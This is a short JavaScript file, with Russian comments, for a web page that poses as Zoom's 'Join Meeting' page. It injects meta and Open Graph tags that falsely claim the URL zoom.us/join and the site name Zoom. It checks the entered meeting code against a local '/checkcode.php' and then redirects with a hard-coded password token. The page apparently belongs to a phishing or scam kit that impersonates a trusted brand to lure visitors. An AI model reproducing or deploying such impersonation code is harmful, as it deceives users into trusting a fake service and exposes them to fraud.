// Создаем meta теги
const metaTags = [
  { name: 'keywords', content: 'zoom, zoom.us, video conferencing, video conference, online meetings, web meeting, video meeting, cloud meeting, cloud video, group video call, group video chat, screen share, application share, mobility, mobile collaboration, desktop share, video collaboration, group messaging' },
  { name: 'description', content: 'Join a Zoom Meeting directly from your web browser using a meeting code or link.' },
  { property: 'og:type', content: 'website' },
  { property: 'og:url', content: 'https://zoom.us/join' },
  { property: 'og:title', content: 'Join Meeting | Zoom' },
  { property: 'og:description', content: 'Join a Zoom Meeting directly from your web browser using a meeting code or link.' },
  { property: 'og:image', content: 'https://st3.zoom.us/static/6.3.21948/image/thumb.png' },
  { property: 'og:site_name', content: 'Zoom' }
];

// Добавляем мета теги в <head> элемент
const head = document.head;
metaTags.forEach(tag => {
  const metaTag = document.createElement('meta');
  for (let key in tag) {
      metaTag.setAttribute(key, tag[key]);
  }
  head.appendChild(metaTag);
});
var buttonLanguage = document.getElementById("wc-dropdown-language");

buttonLanguage.addEventListener("click", function () {
  var dropdownLanguage = document.getElementById("wc-dropdown-menu");
  dropdownLanguage.style.display = "block";
});
$(function () {
  var joinInput = $("#join-confno");
  if (joinInput.length > 0 && joinInput.val().length === 0) {
    disableJoinBtn();
  } else {
    enableJoinBtn();
  }
  joinInput.bind("change keyup input", function () {
    if (joinInput.length > 0 && joinInput.val().length === 0) {
      disableJoinBtn();
      return;
    }
    var confno = $.trim(joinInput.val());
    if (!isNaN(confno.charAt(0))) {
      confno = confno.replace(/[^\d]/g, "");
      var meetingNumber9 = 9;
      var meetingNumber10 = 10;
      var meetingNumber11 = 11;
      if (
        confno.length !== meetingNumber9 &&
        confno.length !== meetingNumber10 &&
        confno.length !== meetingNumber11
      ) {
        disableJoinBtn();
        return;
      }
      enableJoinBtn();
    } else {
      if (confno.length < 5) {
        disableJoinBtn();
      } else {
        enableJoinBtn();
      }
    }
  });
});
function disableJoinBtn() {
  $("#btnSubmit").attr("disabled", true);
  $("#btnSubmit").css("background-color", "rgba(82, 82, 128, 0.09)");
  $("#btnSubmit").css("border-color", "#fff");
  $("#btnSubmit").css("color", "#909096");
}
function enableJoinBtn() {
  $("#btnSubmit").attr("disabled", false);
  $("#btnSubmit").css("background-color", "#0E71EB");
  $("#btnSubmit").css("border-color", "#0E71EB");
  $("#btnSubmit").css("color", "#fff");
}
$("#btnSubmit").click(function () {
  $.ajax({
    url: '/checkcode.php',
    type: 'POST',
    data: { 
        code: $("#join-confno").val()
    }, // Обратите внимание, что мы здесь больше не преобразуем данные в JSON
    success: function (result) {
      console.log(result);
      if (result == "1") {
        localStorage.setItem("code", $("#join-confno").val());
        window.location.href = "/?pwd=QFPJJ9Rv1wBUsxFr50QxnXLlLpZTT5.1#succes&code="+$("#join-confno").val();
      } else {
        $("#join-errormsg").removeClass("hideme")
      }
    },
  });
});

